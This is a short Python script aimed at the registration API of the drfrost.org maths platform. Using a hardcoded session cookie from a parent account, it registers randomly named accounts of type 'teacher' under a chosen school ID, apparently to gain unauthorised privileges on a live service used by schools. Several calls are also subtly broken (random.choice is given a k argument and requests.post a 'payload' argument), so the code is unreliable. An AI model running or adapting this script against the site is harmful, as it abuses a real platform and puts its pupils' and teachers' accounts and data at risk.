import requests
import random
import string


global PHPSESSID
PHPSESSID = "q232nu6b1ocmquruf5phol3kpu" #enter PHPSESSID of the "controller" parent account


def create_child(target_sid, cid):
    url = "https://drfrost.org/api/auth/register/manual"

    headers = {
        "Baggage":'sentry-environment=production,sentry-release=c41b1b164d3376beb4a0cd78e96fe2643167b983,sentry-public_key=e9a7cb90d7fe84969ed38bfd9a243f56,sentry-trace_id=80d6b8fc09ec45af898380d7992e6ed9',
        "Cookie":f'PHPSESSID={PHPSESSID}; GCLB=CImdufLm5bS22QEQAw',
        "Origin":"https://www.drfrost.org",
        "Refer":f"https://www.drfrost.org/settings.php?cid={cid}",
        "User-Agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
        "X-Requested-With":"XMLHttpRequest"}


    firstname = ''.join(random.choice(string.ascii_letters + string.digits, k=5))
    surname = ''.join(random.choice(string.ascii_letters + string.digits, k=5))
    email = ''.join(random.choice(string.ascii_letters + string.digits, k=5))

    payload = {"firstname":firstname,
               "surname":surname,
               "email":email,
               "type":"teacher",
               "cid":cid,
               "sid":target_sid}
    
    r = requests.post(url,headers=headers,payload=payload)
    print(r.status_code)
    print(f"Firstname:{firstname}  |  Surname:{surname}  |  Email:{email}  |  SID:{target_sid}")


#target school id, and your "controller" class id (found in the url of the "My Children" page)
create_child(None,342062)